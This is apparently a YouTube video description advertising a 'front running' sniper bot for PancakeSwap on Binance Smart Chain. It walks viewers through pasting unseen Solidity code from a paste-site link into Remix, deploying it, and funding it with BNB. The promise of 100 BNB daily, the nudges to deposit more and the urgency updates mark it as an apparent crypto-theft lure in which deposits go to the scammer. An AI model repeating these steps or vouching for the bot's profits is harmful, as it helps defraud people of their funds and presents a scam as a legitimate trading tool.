title: (UPDATED) Make 100BNB+ Daily With a PancakeSwap Front Running Contract Bot | Dex Sniper Bot :face screaming in fear:
description: Hey guys :waving hand:... In this video, I would demonstrate a simple front-running deployment in Solidity that automatically detects any new liquidity to a BSC token and buys and sells it at a profit.    The current contract specifications are that 10% of profit is automatically re-entered into the front running pool, and 90% of the profit is automatically transacted back to your wallet. Until you use the "Action" function in Remix, the leftover pool keeps running for profit.    NOTE: This contract was created for the Binance Smart Chain and will not function on the Ethereum main net (On UniSwap for example)    1. Get Metamask:   https://metamask.io/download.html    2. Connect Metamask to Binance Smart Chain (use Mainnet):  https://academy.binance.com/en/articl...    3. Access Remix:  https://remix.ethereum.org/    4. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: "AutoBot.sol"    5. Paste Smart Contract in Remix: (Copy and Paste as it is) - Code Updated Daily  https://justpaste.it/ehczw    6. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it.    7. Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now    8. Deposit funds to exact your newly BOT contract address    9. After the transaction is confirmed, Start the BOT by clicking the "Action" button    Happy front-running!      // *Update    I received messages from persons who didn't put enough money into the contract to cover gas and possible burn costs. The bot seeks token contracts with a burning charge of little more than 10% and no more than 6%, although most tokens now have 36% fees. The average cost of gas is 0.006*2. (0.12) It's preferable when there isn't any burn.    If you fund the contract with 0.2 BNB and the bot targets another token with high burn fees the contract will basically waste in fees more than making a profit. I recommend funding the contract with at least 0.5  - 1BNB just to make sure that won't happen.    UPDATE #2:  Many bots are currently exploiting our source code since this bot was exposed, causing considerable congestion on the BSC network (we apologize @BSC). To ensure competitiveness with other active bots, we propose funding your BNB deposit to 0.5 BNB.    UPDATE #3:  We are continuing to work on bots for the ETH network, COMING SOON.      // *Tags  pancakeswap bot,pancakeswap,uniswap bot,pancakeswap sniper bot,pancake swap bot,swap bot for
